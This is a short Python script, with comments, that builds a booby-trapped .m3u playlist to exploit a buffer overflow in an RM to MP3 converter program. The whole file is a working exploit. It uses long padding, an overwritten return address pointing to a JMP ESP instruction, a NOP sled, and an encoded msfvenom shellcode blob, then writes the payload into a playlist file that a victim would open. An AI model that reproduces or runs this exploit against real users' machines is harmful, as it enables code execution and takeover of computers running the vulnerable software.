#This is a python script that generates a .m3u file type. When loaded on an  RM to MP3 converter, it crashes the application. 
#The buf shellcode is generated using msfvenom from the Metasploitable framework.

header="#EXTM3U\r\n" #header format of .m3u file type
line1="#EXTINF:191,Artist Name - Track Title\r\n" #Information about an audio file 
url_part1="https://" #First part of the URL that does not change static in nature
junk1="A"*26104
eip="\xFA\xE3\x1B\x78" #jump ESP value  written in Little-endian 
junk2 = "\x43" * 100
nops="\x90"*16 #no operation code for padding in order to reduce the chances of the payload failing
buf =  "" #Shellcode generated from running the payload
buf += "\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x69\xab\xf3\xdd\x83\xee\xfc\xe2\xf4\x95\x43"
buf += "\x71\xdd\x69\xab\x93\x54\x8c\x9a\x33\xb9\xe2\xfb\xc3"
buf += "\x56\x3b\xa7\x78\x8f\x7d\x20\x81\xf5\x66\x1c\xb9\xfb"
buf += "\x58\x54\x5f\xe1\x08\xd7\xf1\xf1\x49\x6a\x3c\xd0\x68"
buf += "\x6c\x11\x2f\x3b\xfc\x78\x8f\x79\x20\xb9\xe1\xe2\xe7"
buf += "\xe2\xa5\x8a\xe3\xf2\x0c\x38\x20\xaa\xfd\x68\x78\x78"
buf += "\x94\x71\x48\xc9\x94\xe2\x9f\x78\xdc\xbf\x9a\x0c\x71"
buf += "\xa8\x64\xfe\xdc\xae\x93\x13\xa8\x9f\xa8\x8e\x25\x52"
buf += "\xd6\xd7\xa8\x8d\xf3\x78\x85\x4d\xaa\x20\xbb\xe2\xa7"
buf += "\xb8\x56\x31\xb7\xf2\x0e\xe2\xaf\x78\xdc\xb9\x22\xb7"
buf += "\xf9\x4d\xf0\xa8\xbc\x30\xf1\xa2\x22\x89\xf4\xac\x87"
buf += "\xe2\xb9\x18\x50\x34\xc3\xc0\xef\x69\xab\x9b\xaa\x1a"
buf += "\x99\xac\x89\x01\xe7\x84\xfb\x6e\x54\x26\x65\xf9\xaa"
buf += "\xf3\xdd\x40\x6f\xa7\x8d\x01\x82\x73\xb6\x69\x54\x26"
buf += "\xb7\x61\xf2\xa3\x3f\x94\xeb\xa3\x9d\x39\xc3\x19\xd2"
buf += "\xb6\x4b\x0c\x08\xfe\xc3\xf1\xdd\x68\x10\x7a\x3b\x03"
buf += "\xbb\xa5\x8a\x01\x69\x28\xea\x0e\x54\x26\x8a\x01\x1c"
buf += "\x1a\xe5\x96\x54\x26\x8a\x01\xdf\x1f\xe6\x88\x54\x26"
buf += "\x8a\xfe\xc3\x86\xb3\x24\xca\x0c\x08\x01\xc8\x9e\xb9"
buf += "\x69\x22\x10\x8a\x3e\xfc\xc2\x2b\x03\xb9\xaa\x8b\x8b"
buf += "\x56\x95\x1a\x2d\x8f\xcf\xdc\x68\x26\xb7\xf9\x79\x6d"
buf += "\xf3\x99\x3d\xfb\xa5\x8b\x3f\xed\xa5\x93\x3f\xfd\xa0"
buf += "\x8b\x01\xd2\x3f\xe2\xef\x54\x26\x54\x89\xe5\xa5\x9b"
buf += "\x96\x9b\x9b\xd5\xee\xb6\x93\x22\xbc\x10\x03\x68\xcb"
buf += "\xfd\x9b\x7b\xfc\x16\x6e\x22\xbc\x97\xf5\xa1\x63\x2b"
buf += "\x08\x3d\x1c\xae\x48\x9a\x7a\xd9\x9c\xb7\x69\xf8\x0c"
buf += "\x08"
payload=junk1 + eip + junk2 + nops + buf
url_part2=".lifewire.com/Sample.mp3" #second part of the url that remains static

exploit=open("C:\last_exploit\mp3.m3u","w") # .m3u file creation
exploit.write(header + line1 + url_part1 + payload + url_part2) #writing into the file.
